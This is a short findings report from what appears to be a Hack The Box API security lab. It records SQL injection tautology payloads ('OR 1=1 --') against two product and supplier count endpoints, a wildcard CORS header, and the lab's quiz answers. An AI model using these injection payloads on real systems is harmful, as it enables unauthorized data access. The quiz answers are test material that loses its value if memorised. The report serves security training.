# Lab findings — Security Misconfiguration (API8)

**Target:** `http://154.57.164.65:31687`  
**Date:** 2026-08-02  
**Tools:** curl, URL-encoding, Origin header  

## 1) SQL injection — products count (academy / p12)

| Item | Detail |
|------|--------|
| Auth | Supplier `htbpentester12@pentestercompany.com` |
| Role | `Products_GetProductsTotalCountByNameSubstring` |
| Endpoint | `GET /api/v1/products/{Name}/count` |
| Baseline | `laptop` → `productsCount: 18` |
| Quote | `laptop'` → `errorMessage: An error has occurred!` |
| Tautology | `laptop' OR 1=1 --` → `productsCount: 722` |

## 2) SQL injection — suppliers count (Q1 / p13)

| Item | Detail |
|------|--------|
| Auth | Customer `htbpentester13@hackthebox.com` |
| Role | `Suppliers_GetTotalCountBySupplierNameSubstring` |
| Endpoint | `GET /api/v1/suppliers/{Name}/count` |
| Baseline | `test` → `7` |
| Quote | `test'` → error |
| Tautology | `test' OR 1=1 --` → **`suppliersCount: 151`** |

**Q1 answer (total records in target table):**

```text
151
```

(Also `%` alone returned 151 — LIKE wildcard behavior.)

## 3) CORS misconfiguration (Q2)

```http
Access-Control-Allow-Origin: *
```

Observed on authenticated and unauthenticated responses (`Server: Kestrel`).  
No restrictive allowlist; any browser origin can read response bodies for cross-origin fetches permitted by the browser model.

**Q2 answer:**

```text
Access-Control-Allow-Origin: *
```

## Evidence

```text
evidence/roles-p12.json
evidence/roles-p13.json
evidence/products-sqli.txt
evidence/suppliers-sqli.txt
evidence/Q1-count.txt
evidence/Q2-header.txt
evidence/headers-with-origin.txt
evidence/FLAGS.txt
```

JWTs redacted.

## Operator runbook

[../../execution_batches/08-security-misconfiguration.md](../../execution_batches/08-security-misconfiguration.md)
